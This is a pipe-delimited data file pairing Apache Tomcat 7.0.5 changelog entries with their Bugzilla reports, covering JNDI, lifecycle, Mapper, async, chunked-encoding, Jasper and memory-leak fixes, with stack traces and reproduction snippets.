On a related issue, MapperListener is not registered as Container/LifecycleListener for StandardContext on starting up Tomcat.


I attached the patch for above issues.

Best regards."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50157
Catalina|Tomcat 7.0.5 (markt)|fix|50159|Add a new attribute for <Resource> elements, singleton, that controls whether or not a new object is created every time a JNDI lookup is performed to obtain the resource. The default value is true, which will return the same instance of the resource in every JNDI lookup. (markt)|JNDI context returns new datasource instance each request|"Requesting a javax.sql.DataSource via JNDI results in a new instance each time.

In my particular case I have defined a c3p0 connection pool as follows:

<Resource auth=""Container""
   name=""jdbc/mydb""
   description=""My Database""
   factory=""org.apache.naming.factory.BeanFactory""
   type=""com.mchange.v2.c3p0.ComboPooledDataSource""
   driverClass=""org.gjt.mm.mysql.Driver""
   jdbcUrl=""jdbc:mysql://localhost:3306/mydb?autoReconnect=true""
   user=""myUserName""
   password=""myPassword""
   minPoolSize=""5""
   maxPoolSize=""50""
   acquireIncrement=""1""
   idleConnectionTestPeriod=""100""
   maxIdleTime=""1800""
   preferredTestQuery=""SELECT 1;""
/>

I am using a 3rd party library to access the datasource.  Each time a request is made I can see a new connection pool being created.  With a simple test I was also able to see that the instance being returned was different each time.  Test code:

Context initialContext = new InitialContext();
return ((DataSource)initialContext.lookup(this.dataSource)).getConnection();

When comparing the source code for org.apache.naming.NamingContext between 7.02 and 7.04 the following 4 lines of code were removed (line 808):

if (obj != null) {
   entry.value = obj;
   entry.type = NamingEntry.ENTRY;
}

Adding this code back into the class fixes the issue."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50159
Catalina|Tomcat 7.0.5 (markt)|fix|50168|Separate the Lifecycle.DESTROY_EVENT into Lifecycle.BEFORE_DESTROY_EVENT and Lifecycle.AFTER_DESTROY_EVENT. Use the additional state to ensure that Context objects are only destroyed once. (markt)|destory method is called twice while the child is destoryed directly|"While calling the method destory() on the StandardContext directly, it seems that the method destoryInternal() is called twice in the LifecycleMBeanBase, the two stacktraces are below :
    a.  LifecycleMBeanBase.unregister(ObjectName) line: 191   
         LifecycleMBeanBase.destroyInternal() line: 73   
         ContainerBase.destroyInternal() line: 1109   
         StandardContext.destroyInternal() line: 5114   
         LifecycleBase.destroy() line: 271   
         ContainerBase.removeChild(Container) line: 963   
         ContainerBase.destroyInternal() line: 1106   
         StandardContext.destroyInternal() line: 5114   
         LifecycleBase.destroy() line: 271   
         ...
     b. LifecycleMBeanBase.unregister(ObjectName) line: 191   
         LifecycleMBeanBase.destroyInternal() line: 73   
         ContainerBase.destroyInternal() line: 1109   
         StandardContext.destroyInternal() line: 5114   
         LifecycleBase.destroy() line: 271
         ..."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50168
Catalina|Tomcat 7.0.5 (markt)|fix|50169|Ensure that when a Container is started that it doesn't try and register with the mapper unless its parent has already started. Patch provided by Eiji Takahashi. (markt)|Trying to register wrapper and welcomeFile to Mapper before context is registered on Mapper.|"Created attachment 26220 [details]
patch for StandardContext and StandardWrapper

When I used ""Host start operation"" via JMX, I got error messages.

2010/10/28 11:04:10 org.apache.tomcat.util.http.mapper.Mapper addWrapper
SEVERE: No context found: 
2010/10/28 11:04:10 org.apache.tomcat.util.http.mapper.Mapper addWrapper
SEVERE: No context found: 
2010/10/28 11:04:10 org.apache.tomcat.util.http.mapper.Mapper addWrapper
SEVERE: No context found: 
2010/10/28 11:04:10 org.apache.tomcat.util.http.mapper.Mapper addWrapper
SEVERE: No context found: 
2010/10/28 11:04:10 org.apache.tomcat.util.http.mapper.Mapper addWrapper
SEVERE: No context found: 
2010/10/28 11:04:10 org.apache.tomcat.util.http.mapper.Mapper addWrapper
SEVERE: No context found: 
2010/10/28 11:04:10 org.apache.tomcat.util.http.mapper.Mapper addWelcomeFile
SEVERE: No context found: 
2010/10/28 11:04:10 org.apache.tomcat.util.http.mapper.Mapper addWelcomeFile
SEVERE: No context found: 
2010/10/28 11:04:10 org.apache.tomcat.util.http.mapper.Mapper addWelcomeFile
SEVERE: No context found: 
2010/10/28 11:04:10 org.apache.tomcat.util.http.mapper.Mapper addWelcomeFile
SEVERE: No context found: 
2010/10/28 11:04:10 org.apache.tomcat.util.http.mapper.Mapper addWelcomeFile
SEVERE: No context found: 
2010/10/28 11:04:10 org.apache.tomcat.util.http.mapper.Mapper addWelcomeFile
SEVERE: No context found: 

At first StandardHost starts /manager context.
(1) LifecycleState is STARTING_PREP now. Wrapper is not registered because host has not been registered. 
	Mapper.addWrapper(String, String, String, Object, boolean) line: 331	
	MapperListener.containerEvent(ContainerEvent) line: 169	
	StandardWrapper(ContainerBase).fireContainerEvent(String, Object) line: 1253	
	StandardWrapper.addMapping(String) line: 740	
	StandardContext.addServletMapping(String, String, boolean) line: 2921	
	StandardContext.addServletMapping(String, String) line: 2881	
	WebXml.configureContext(Context) line: 1274	
	ContextConfig.webConfig() line: 1283	
	ContextConfig.configureStart() line: 881	
	ContextConfig.lifecycleEvent(LifecycleEvent) line: 315	
	LifecycleSupport.fireLifecycleEvent(String, Object) line: 119	
	StandardContext(LifecycleBase).fireLifecycleEvent(String, Object) line: 89	
	StandardContext.startInternal() line: 4834	
	StandardContext(LifecycleBase).start() line: 140	
	StandardHost(ContainerBase).startInternal() line: 1027	
	StandardHost.startInternal() line: 788	
	StandardHost(LifecycleBase).start() line: 140	

(2) Set LifecycleState to STARTED. Register context and host on Mapper.
	Mapper.addHost(String, String[], Object) line: 96	
	Mapper.addContext(String, Object, String, Object, String[], Context) line: 226	
	MapperListener.registerContext(Context) line: 339	
	MapperListener.lifecycleEvent(LifecycleEvent) line: 411	
	LifecycleSupport.fireLifecycleEvent(String, Object) line: 119	
	StandardContext(LifecycleBase).fireLifecycleEvent(String, Object) line: 89	
	StandardContext(LifecycleBase).setState(LifecycleState, Object) line: 325	
	StandardContext(LifecycleBase).setState(LifecycleState) line: 305	
	StandardContext(LifecycleBase).start() line: 156	
	StandardHost(ContainerBase).startInternal() line: 1027	
	StandardHost.startInternal() line: 788	
	StandardHost(LifecycleBase).start() line: 140	

(3) Register wrapper again. It succeeds because context has been registered on Mapper.
	Mapper.addWrapper(String, String, String, Object, boolean) line: 328	
	MapperListener.registerWrapper(Wrapper) line: 394	
	MapperListener.registerContext(Context) line: 343	
	MapperListener.lifecycleEvent(LifecycleEvent) line: 411	
	LifecycleSupport.fireLifecycleEvent(String, Object) line: 119	
	StandardContext(LifecycleBase).fireLifecycleEvent(String, Object) line: 89	
	StandardContext(LifecycleBase).setState(LifecycleState, Object) line: 325	
	StandardContext(LifecycleBase).setState(LifecycleState) line: 305	
	StandardContext(LifecycleBase).start() line: 156	
	StandardHost(ContainerBase).startInternal() line: 1027	
	StandardHost.startInternal() line: 788	
	StandardHost(LifecycleBase).start() line: 140	

Next, StandardHost starts ROOT context.
(4) Register wrapper. Then, gets error as follows because context has not been registered.
2010/10/28 11:04:10 org.apache.tomcat.util.http.mapper.Mapper addWrapper
SEVERE: No context found: 

	Mapper.addWrapper(String, String, String, Object, boolean) line: 338	
	MapperListener.containerEvent(ContainerEvent) line: 169	
	StandardWrapper(ContainerBase).fireContainerEvent(String, Object) line: 1253	
	StandardWrapper.addMapping(String) line: 740	
	StandardContext.addServletMapping(String, String, boolean) line: 2921	
	StandardContext.addServletMapping(String, String) line: 2881	
	WebXml.configureContext(Context) line: 1274	
	ContextConfig.webConfig() line: 1283	
	ContextConfig.configureStart() line: 881	
	ContextConfig.lifecycleEvent(LifecycleEvent) line: 315	
	LifecycleSupport.fireLifecycleEvent(String, Object) line: 119	
	StandardContext(LifecycleBase).fireLifecycleEvent(String, Object) line: 89	
	StandardContext.startInternal() line: 4834	
	StandardContext(LifecycleBase).start() line: 140	
	StandardHost(ContainerBase).startInternal() line: 1027	
	StandardHost.startInternal() line: 788	
	StandardHost(LifecycleBase).start() line: 140	

(5) Set LifecycleState to STARTED, and register context.
	Mapper.addContext(String, Object, String, Object, String[], Context) line: 223	
	MapperListener.registerContext(Context) line: 339	
	MapperListener.lifecycleEvent(LifecycleEvent) line: 411	
	LifecycleSupport.fireLifecycleEvent(String, Object) line: 119	
	StandardContext(LifecycleBase).fireLifecycleEvent(String, Object) line: 89	
	StandardContext(LifecycleBase).setState(LifecycleState, Object) line: 325	
	StandardContext(LifecycleBase).setState(LifecycleState) line: 305	
	StandardContext(LifecycleBase).start() line: 156	
	StandardHost(ContainerBase).startInternal() line: 1027	
	StandardHost.startInternal() line: 788	
	StandardHost(LifecycleBase).start() line: 140	

(6) Register wrapper.  It succeeds because context has been registered on Mapper.
	Mapper.addWrapper(String, String, String, Object, boolean) line: 328	
	MapperListener.registerWrapper(Wrapper) line: 394	
	MapperListener.registerContext(Context) line: 343	
	MapperListener.lifecycleEvent(LifecycleEvent) line: 411	
	LifecycleSupport.fireLifecycleEvent(String, Object) line: 119	
	StandardContext(LifecycleBase).fireLifecycleEvent(String, Object) line: 89	
	StandardContext(LifecycleBase).setState(LifecycleState, Object) line: 325	
	StandardContext(LifecycleBase).setState(LifecycleState) line: 305	
	StandardContext(LifecycleBase).start() line: 156	
	StandardHost(ContainerBase).startInternal() line: 1027	
	StandardHost.startInternal() line: 788	
	StandardHost(LifecycleBase).start() line: 140	

I think that addWrapper() is unnecessary until LifecycleState for StandardContext become STARTED.
addWelcomeFile() is also similar.

I attached the patch that prevent this error message.

Best regards."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50169
Catalina|Tomcat 7.0.5 (markt)|add|50222|Modify memory leak prevention code so it pins the system class loader in memory rather than than the common class loader, which is better for embedded systems. Patch provided by Christopher Schultz. (markt)|JreMemoryLeakPreventionListener should speculatively cause memory leaks using the system ClassLoader|"JreMemoryLeakPreventionListener intentionally invokes methods known to pin the context ClassLoader in memory in order to avoid having a WebappClassLoader unintentionally pin itself. This may cause undesirable behavior in embedded environments.

Instead, JMLPL could use a security context to temporarily set the current context ClassLoader to be the system ClassLoader and solve the embedded situation without the client having to remember to take this care."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50222
Catalina|Tomcat 7.0.5 (markt)|add||Improve debug logging for MapperListener registration. (markt)|||
Catalina|Tomcat 7.0.5 (markt)|add||Expose names of LifecycleListeners and ContainerListeners for StandardContext via JMX. (markt)|||
Catalina|Tomcat 7.0.5 (markt)|add||Add a new option, resourceOnlyServlets, to Context elements that provides a mechanism for working around the issues caused by new requirements for welcome file mapping introduced in Servlet 3.0. By default, the existing Tomcat 6.0.x welcome file handling is used. (markt)|||
Catalina|Tomcat 7.0.5 (markt)|fix||Make Tomcat more tolerant of null when generating JMX names for Valves. (markt)|||
Catalina|Tomcat 7.0.5 (markt)|fix||Make AccessLogValve attribute enabled changeable via JMX. (pero)|||
Catalina|Tomcat 7.0.5 (markt)|fix||Correct infinite loop if ServletRequest.startAsync(ServletRequest, ServletResponse) was called. (markt)|||
Catalina|Tomcat 7.0.5 (markt)|fix|50232|Remove dependency between StoreBase and PersistentManager and associated code clean-up. Patch provided by Tiago Batista. (markt)|org.apache.catalina.session.StoreBase has a hidden dependency on PersistentManager|"Created attachment 26270 [details]
Removes hidden dependency on PersistentStore

StoreBase.java depends explicitly on the Manager interface, however, it later casts the manager object to the PersistentManager class with out any check.

This removes that dependency, therefore allowing the usage of this store with any manager that does not extend PersistentManager.

I will later attach a path that removes the offending isLoaded() method as that may induce the same problem further along..."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50232
Catalina|Tomcat 7.0.5 (markt)|fix|50252|Prevent ClassCastException when using a <ResourceLink>. Patch provided by Eiji Takahashi. (markt)|ClassCastException occurs if context.xml contains <ResourceLink>.|"Created attachment 26281 [details]
patch for NamingContext.java

If context.xml contains <ResourceLink>, ClassCastException occurs as follows.

java.lang.ClassCastException: org.apache.naming.ResourceLinkRef cannot be cast to org.apache.naming.ResourceRef
        at org.apache.naming.NamingContext.lookup(NamingContext.java:828)
        at org.apache.naming.NamingContext.lookup(NamingContext.java:145)
        at org.apache.naming.NamingContext.lookup(NamingContext.java:814)
        at org.apache.naming.NamingContext.lookup(NamingContext.java:159)
        at org.apache.catalina.core.DefaultInstanceManager.lookupFieldResource(DefaultInstanceManager.java:460)
        at org.apache.catalina.core.DefaultInstanceManager.processAnnotations(DefaultInstanceManager.java:299)
        at org.apache.catalina.core.DefaultInstanceManager.newInstance(DefaultInstanceManager.java:137)
        at org.apache.catalina.core.DefaultInstanceManager.newInstance(DefaultInstanceManager.java:119)
        at org.apache.catalina.core.StandardWrapper.loadServlet(StandardWrapper.java:1046)
        at org.apache.catalina.core.StandardWrapper.allocate(StandardWrapper.java:797)
        at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:135)
        at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:161)
        at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:164)
        at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:108)
        at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:558)
        at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
        at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:379)
        at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:242)
        at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:259)
        at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:237)
        at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:281)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:619)

This issue is relating to the following issue.
https://issues.apache.org/bugzilla/show_bug.cgi?id=50159

I attached the patch for this issue.
Regards."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50252
Catalina|Tomcat 7.0.5 (markt)|add||Reduce synchronization in session managers to improve performance of session creation. (markt)|||
Catalina|Tomcat 7.0.5 (markt)|fix||If starting children automatically when adding them to a container (e.g. when adding a Context to a Host) don't lock the parent's set of children whilst the new child is being started since this can block other threads and cause issues such as lost cluster messages. (markt)|||
Catalina|Tomcat 7.0.5 (markt)|add||Implement support for parallel deployment. This allows multiple versions of the same web application to be deployed to the same context path at the same time. Users without a current session will be mapped to the latest version of the web application. Users with a current session will continue to use the version of the web application with which the session is associated until the session expires. (markt)|||
Catalina|Tomcat 7.0.5 (markt)|fix|50308|Allow asynchronous request processing to call AsyncContext.dispatch() once the asynchronous request has timed out. (markt)|Call to AsyncContext.dispatch() in the onTimeout callback throws exception|"When dispatch() method is called inside the onTimeout() function of the AsyncListener, the exception is thrown:

SEVERE: An exception or error occurred in the container during the request processing
java.lang.IllegalStateException: Calling [dispatchAsync()] is not valid for a request with Async state [TIMING_OUT]
	at org.apache.coyote.AsyncStateMachine.asyncDispatch(AsyncStateMachine.java:220)
	at org.apache.coyote.http11.Http11NioProcessor.actionInternal(Http11NioProcessor.java:672)
	at org.apache.coyote.http11.AbstractHttp11Processor.action(AbstractHttp11Processor.java:937)
	at org.apache.coyote.Request.action(Request.java:348)
	at org.apache.catalina.core.AsyncContextImpl.dispatch(AsyncContextImpl.java:173)
	at org.apache.catalina.core.AsyncContextImpl.dispatch(AsyncContextImpl.java:135)
	at org.apache.catalina.core.AsyncContextImpl.dispatch(AsyncContextImpl.java:130)
	at com.juriy.snowball.SnowServlet$1.onTimeout(SnowServlet.java:23)
	at org.apache.catalina.core.AsyncListenerWrapper.fireOnTimeout(AsyncListenerWrapper.java:45)
	at org.apache.catalina.core.AsyncContextImpl.timeout(AsyncContextImpl.java:109)
	at org.apache.catalina.connector.CoyoteAdapter.asyncDispatch(CoyoteAdapter.java:270)
	at org.apache.coyote.http11.Http11NioProcessor.asyncDispatch(Http11NioProcessor.java:232)
	at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.event(Http11NioProtocol.java:305)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1526)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:619)


The sample code is below:

	protected void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		AsyncContext context = request.startAsync();
		context.setTimeout(3000);
		context.addListener(new AsyncListener() {

			public void onComplete(AsyncEvent asyncEvent) throws IOException {}

			public void onTimeout(AsyncEvent asyncEvent) throws IOException {
				System.out.println(""HITTING TIMEOUT"");
				asyncEvent.getAsyncContext().dispatch();
			}

			public void onError(AsyncEvent asyncEvent) throws IOException {}

			public void onStartAsync(AsyncEvent asyncEvent) throws IOException {}
		});
}


It looks like the Servlet 3.0 specification allows to do such call, here's the quotation that explicitly states the flow of the timeouted async contexts (page 18):

""In the event that an asynchronous operation times out, the container must run
through the following steps:
‚ñ† Invoke the AsyncListener.onTimeout method on all the AsyncListener
instances registered with the ServletRequest on which the asynchronous
operation was initiated.
‚ñ† If none of the listeners called AsyncContext.complete() or any of the
AsyncContext.dispatch methods, perform an error dispatch with a status
code equal to HttpServletResponse.SC_INTERNAL_SERVER_ERROR.
‚ñ† If no matching error page was found, or the error page did not call
AsyncContext.complete() or any of the AsyncContext.dispatch
methods, the container MUST call AsyncContext.complete()""

Second step assumes that the call to dispatch in onTimeout() is allowed."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50308
Catalina|Tomcat 7.0.5 (markt)|add||Make memory leak prevention code that clears ThreadLocal instances more robust against objects with toString() methods that throw exceptions. (markt)|||
Coyote|Tomcat 7.0.5 (markt)|fix|49860|Complete support for handling trailing headers in chunked HTTP requests. (markt)|getParameters() fails on chunked POST requests with trailers|"Created attachment 25967 [details]
Sample code to expose the issue

Overview: A servlet hosted on Tomcat fails to retrieve the request parameters when the request is using chunked transfer encoding and trailers.

Details: Sending a POST http request from a HTTP/1.1 client that uses chunked as transfer encoding and also includes trailers in the request (per RFC2616 sections 3.6.1 and 14.40):
Request: 
===========================
POST /echo/getBody HTTP/1.1
User-Agent: org.test.chunked.EchoClient (chunked-test)
content-type: application/x-www-form-urlencoded
connection: Close
host: localhost:8080
transfer-encoding: chunked

3
a=0
4
&b=1
0
x-Signature: Tuu2
============================

The server responds with an error message (see below) and a stack trace pointing to ChunkedInputFilter class (http://svn.apache.org/repos/asf/tomcat/tc6.0.x/trunk/java/org/apache/coyote/http11/filters/ChunkedInputFilter.java).
The method parseEndChunk() inside this class has a to do comment to handle trailers - this leads me to believe the trailers in chunked requests are not yet supported.

The sample code attached contains means to reproduce the issue:
 - an Eclipse project TestHttpServer that hosts an EchoServlet
 - an Eclipse project TestHttpClient that sends and receives chunked requests and verifies them in a unit test
 - Eclipse's Tomcat server configuration
The code is an extension of the attachments from bug 37794 (https://issues.apache.org/bugzilla/show_bug.cgi?id=37794) related to handling chunked requests in general.

Note that when removing the trailer in the request above, the server responds correctly and is able to extract the parameters sent in the request' body.

Here is the error response that the server sends back:
Response:
============================
Response: 
HTTP/1.1 500 Internal Server Error
Server: Apache-Coyote/1.1
Content-Type: text/html;charset=utf-8
Content-Length: 2266
Date: Wed, 01 Sep 2010 22:48:08 GMT
Connection: close

<html><head><title>Apache Tomcat/6.0.29 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - </h1><HR size=""1"" noshade=""noshade""><p><b>type</b> Exception report</p><p><b>message</b> <u></u></p><p><b>description</b> <u>The server encountered an internal error () that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>java.io.IOException: Invalid CRLF
	org.apache.coyote.http11.filters.ChunkedInputFilter.parseCRLF(ChunkedInputFilter.java:337)
	org.apache.coyote.http11.filters.ChunkedInputFilter.parseEndChunk(ChunkedInputFilter.java:356)
	org.apache.coyote.http11.filters.ChunkedInputFilter.doRead(ChunkedInputFilter.java:136)
	org.apache.coyote.http11.InternalInputBuffer.doRead(InternalInputBuffer.java:710)
	org.apache.coyote.Request.doRead(Request.java:428)
	org.apache.catalina.connector.InputBuffer.realReadBytes(InputBuffer.java:304)
	org.apache.catalina.connector.InputBuffer.realReadChars(InputBuffer.java:360)
	org.apache.tomcat.util.buf.CharChunk.substract(CharChunk.java:379)
	org.apache.catalina.connector.InputBuffer.read(InputBuffer.java:388)
	org.apache.catalina.connector.CoyoteReader.read(CoyoteReader.java:93)
	org.test.chunked.EchoServlet.getBody(EchoServlet.java:90)
	org.test.chunked.EchoServlet.doPostOrGet(EchoServlet.java:60)
	org.test.chunked.EchoServlet.doPost(EchoServlet.java:41)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:637)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
</pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the Apache Tomcat/6.0.29 logs.</u></p><HR size=""1"" noshade=""noshade""><h3>Apache Tomcat/6.0.29</h3></body></html>
===============================

Best regards,
Dan Luca."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49860
Coyote|Tomcat 7.0.5 (markt)|add||Impose a limit on the length of the trailing headers. The limit is configurable with a system property and is 8192 by default. (kkolinko)|||
Coyote|Tomcat 7.0.5 (markt)|fix|50207|Ensure Comet timeout events are triggered. This bug was a regression triggered by the fix for 49884. (markt)|CometProcessor async timeout events are not being fired|"This is reproducible using the the default chat example (ie: ChatServlet, /examples/jsp/chat) and the following additional changes:

1) Enabled Http11Nio in conf/server.xml:

    <Connector 
        address=""0.0.0.0"" 
        port=""8080"" 
        protocol=""org.apache.coyote.http11.Http11NioProtocol""
        connectionTimeout=""20000"" 
        enableLookups=""false""
        acceptCount=""100""
        disableUploadTimeout=""true""
        maxThreads=""15""
        minSpareThreads=""15""
        maxSpareThreads=""15""
        RECYCLE_FACADES=""true""/>

2) Enabled the comet valve in conf/context.xml:

  <Valve className=""org.apache.catalina.valves.CometConnectionManagerValve"" />

The problem is CometEvent.EventType.ERROR (and subtype TIMEOUT) and CometEvent.EventType.END are never being fired.

This can be confirmed in the logs; the messages for these events are never printed.  This worked on Tomcat 6.0.29.

As an aside, what is the most complete/robust way to do async IO in tomcat 7 today, Servlet 3.0 or CometProcessor?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50207
Jasper|Tomcat 7.0.5 (markt)|fix|49297|Enforce the rules in the JSP specification for parsing the attributes of custom and standard actions that require that the attribute names are unique within an element and that there is whitespace before the attribute name. The whitespace test can be disabled by setting the system property org.apache.jasper.compiler.Parser.STRICT_WHITESPACE to false. Attributes of the page directive have slightly different rules. The implementation of that part of the fix is based on a patch by genspring. (markt)|Whitespace absence is allowed before attribute name in a custom tag|"Created attachment 25441 [details]
2010-05-15_tc7_attribute_name_whitespace-test.patch

The /test/webapp-3.0/bug45nnn/bug45015b.jsp page of trunk contains the following text:
<tags:echo echo=""hello ""wo""rld"" />

Running the test (testBug45015b of org.apache.jasper.compiler.TestGenerator) produces the following message:

org.apache.jasper.JasperException: /bug45nnn/bug45015b.jsp(21,30) equal symbol expected


It means, that the parser interprets ""wo"" as an attribute name, ignoring the fact that there is no whitespace before it.


If I write
<tags:echo echo=""hello ""wo=""rld"" />
the test complains that attribute ""wo"" is invalid for the tag,

and finally if I write
<tags:echo echo=""hello ""echo=""rld"" />
the test succeeds, while I would expect it to fail.

I am attaching a patch that adds a testcase based on the last example, though a better testcase is needed that does not use the same attribute name twice.

I think it is a minor issue, because this issue does not affect valid JSP pages, though allows to run some invalid ones.


It is reproducible in the current 6.0 and 5.5 as well (thus 6.0.26, 5.5.29):
if I add the following to /webapps/examples/jsp/simpletag/foo.jsp of TC6 (or the respective page in TC5.5):
<ul>
<eg:foo att1=""1""att2=""2""att3=""3"">
<li><%= member %></li>
</eg:foo>
</ul>

and call http://localhost:8080/examples/jsp/simpletag/foo.jsp
the page runs successfully and displays ""1, 2, 3"" list items among its output.

Expected result: show some compilation error, e.g. "">, /> or whitespace was expected""."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49297
Jasper|Tomcat 7.0.5 (markt)|fix|50105|When processing composite EL expressions use Enum.name() rather than Enum.toString() as required by the EL specification. (markt)|Violation of JSP-EL spec version 2.1 when coerce Enum to String|"Section 1.18.2 of the 2.1 JSP-EL spec (Coerce A to String) says ""if A is Enum, return A.name()"". This is not always the case in Tomcat 6.0.29. To demonstrate the bug, I created some custom code (enum, Tag, JSP):

Tag:

public class MyCustomTag implements Tag {
    public void setValue(String value) {
        System.out.println(value);
    }
    @Override public void setPageContext(PageContext pc) {}
    @Override public void setParent(Tag t) {}
    @Override public Tag getParent() { return null; }
    @Override public int doStartTag() throws JspException { return SKIP_BODY; }
    @Override public int doEndTag() throws JspException { return EVAL_PAGE; }
    @Override public void release() {}
}

TLD:

<?xml version=""1.0"" encoding=""UTF-8"" ?>
<taglib xsi:schemaLocation=""http://java.sun.com/xml/ns/javaeeweb-
jsptaglibrary_2_1.xsd"" xmlns=""http://java.sun.com/xml/ns/javaee"" 
xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" version=""2.1"">
    <tlibversion>1.0</tlibversion>
    <uri>http://my-domain.org/customLib</uri>
    <tag>
        <name>customTag</name>
        <tagclass>mypackage.MyCustomTag</tagclass>
        <bodycontent>empty</bodycontent>
        <attribute>
            <name>value</name>
            <required>true</required>
            <rtexprvalue>true</rtexprvalue>
        </attribute>
    </tag>
</taglib>

Enum:

public enum MyEnum {

    APPLE, ORANGE;

    @Override
    public String toString() {
        return ""this is a "" + name();
    }

}

JSP:

<%@taglib prefix=""myLib"" uri=""http://my-domain.org/customLib""%>

<myLib:customTag value=""${myEnum}""/>
<myLib:customTag value=""foo.${myEnum}.bar""/>

Because the value myEnum is was set to MyEnum.ORANGE, i would expect, that this outputs:

ORANGE
foo.ORANGE.bar

But the output in catalina.out instead is:

ORANGE
foo.this is a ORANGE.bar


Which is a violation of the JSP-EL spec (if I understood it right)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50105
Jasper|Tomcat 7.0.5 (markt)|fix||Fix minor thread-safety and performance issues in the implementation of maxLoadedJsps. (rjung)|||
Jasper|Tomcat 7.0.5 (markt)|add||Add support for unloading JSPs that have not been requested for a long time using the new parameter jspIdleTimeout. (rjung)|||
Jasper|Tomcat 7.0.5 (markt)|add||Add logging and JMX support to JSP unloading. (rjung)|||
Jasper|Tomcat 7.0.5 (markt)|fix|50192|Improve performance for EL when running under a security manager. Based on a patch by Robert Goff. (markt)|performance issue after revision 746425|"Revision 746425 changed at least 2 files: ELResolverImpl and ELContextImpl.  I believe this causes an unnecessary performance regression in these two files.

In ELResolverImpl, every time that getDefaultResolver is called with security enabled, a new Object is going to be created.  It appears as if getDefaultResolver is going to be called a lot and this could significantly hurt performance.  I understand changing the DefaultResolver to be private and allowing access to it through the getter method, however, I don't believe a new object needs to be created every time the method is called.

In ELContextImpl, why does a new FunctionMapper need to be created for each ELContextImpl?

Thanks."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50192
Jasper|Tomcat 7.0.5 (markt)|fix|50228|Improve recycling of BodyContentImpl. This avoids keeping a cached reference to a webapp-provided Writer used in JspFragment.invoke() calls. (kkolinko)|PermGen leak when calling JspFragment.invoke() with a custom Writer|"Created attachment 26266 [details]
writerleak.war - Reproduces the leak

We have a web application that contains a SimpleTag that calls JspFragment.invoke(writer) with a custom java.io.Writer (actually, a NullWriter from commons-io).

When this application is undeployed, it still remains in memory, as reported by the ""Find leaks"" tool in the manager webapp.

I am attaching a simple sample application that reproduces the issue.

To reproduce:
1. Deploy the app.
2. Open index.jsp
3. Undeploy the app.
4. ""Find leaks"" reports that the app is still in memory


Using the Eclipse MAT tool I can see that the leak is caused by o.a.jasper.runtime.BodyContentImpl keeping a reference to the Writer,
while the BodyContentImpl instance is cached in some pool referenced by a ThreadLocal."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50228
Jasper|Tomcat 7.0.5 (markt)|add|50273|Provide a workaround for an HP-UX issue that can result in large numbers of SEVERE log messages appearing in the logs as a result of normal operation. (markt)|AprEndpoint logs socket accept fails altough error is harmless|"I use the above Tomcat on my HP-UX 11.23 system. I have compiled libtcnative 1.1.20 successfully. Tomcat is spamming my log files with this error message:

5.11.2010 09:06:29 org.apache.tomcat.util.net.AprEndpoint$Acceptor run
SCHWERWIEGEND: Socket accept failed
org.apache.tomcat.jni.Error: Kein Pufferplatz verf√ºgbar
        at org.apache.tomcat.jni.Socket.accept(Native Method)
        at org.apache.tomcat.util.net.AprEndpoint$Acceptor.run(AprEndpoint.java:1169)
        at java.lang.Thread.run(Thread.java:619)

In English: No buffer space available. I googled for the problem and this out:
http://forums.devx.com/archive/index.php/t-99967.html

This bug occurs with the IE6 & IE8 on our setup. I wasn't able to filter this our with java logging, it simple ignored loading my filter.
Searching the APR docs I found this: http://dev.ariel-networks.com/apr/apr-tutorial/html/apr-tutorial-13.html Section ""Detection of the remote host closed the socket""

The error seems to be harmless, a debug or info would satisfy here but in the level severe it simply spams my disk.

Is there a way to fix that according to the APR docs? I have no clue in C."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50273
